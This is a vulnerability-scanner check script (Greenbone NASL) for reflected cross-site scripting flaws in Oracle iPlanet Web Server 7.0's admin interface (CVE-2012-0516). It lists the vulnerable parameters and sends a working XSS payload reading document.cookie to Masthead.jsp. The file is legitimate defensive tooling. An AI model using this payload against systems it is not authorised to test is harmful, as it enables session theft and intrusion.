# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:oracle:iplanet_web_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902844");
  script_version("2025-03-05T05:38:53+0000");
  script_cve_id("CVE-2012-0516");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:53 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2012-06-29 16:16:16 +0530 (Fri, 29 Jun 2012)");
  script_name("Oracle iPlanet Web Server Multiple XSS Vulnerabilities (cpuapr2012)");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_sun_oracle_web_server_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("oracle/iplanet_web_server/http/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/43942");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53133");
  script_xref(name:"URL", value:"http://chingshiong.blogspot.in/2012/04/oracle-iplanet-web-server-709-multiple.html");
  script_xref(name:"URL", value:"https://www.oracle.com/security-alerts/cpuapr2012.html#AppendixSUNS");

  script_tag(name:"summary", value:"Oracle iPlanet Web Server is prone to multiple cross-site
  scripting (XSS) vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser session in the context
  of an affected site.");

  script_tag(name:"affected", value:"Oracle iPlanet Web Server 7.0.");

  script_tag(name:"insight", value:"The following flaws exist:

  - Input passed via the 'helpLogoWidth' and 'helpLogoHeight' parameters to
  admingui/cchelp2/Masthead.jsp (when 'mastheadTitle' is set) and the 'productNameSrc',
  'productNameHeight', and 'productNameWidth' parameters to admingui/version/Masthead.jsp is not
  properly sanitised before being returned to the user.

  - Input passed via the 'appName' and 'pathPrefix' parameters to admingui/cchelp2/Navigator.jsp is
  not properly sanitised before being returned to the user.");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the references for
  more information.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/admingui/version/Masthead.jsp?productNameSrc='%22--></style></script><script>alert(document.cookie)</script>&versionFile=../version/copyright?__token__=&productNameHeight=42&productNameWidth=221";

req = http_get(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req);

if(res && res =~ "^HTTP/1\.[01] 200" && "<script>alert(document.cookie)</script>" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
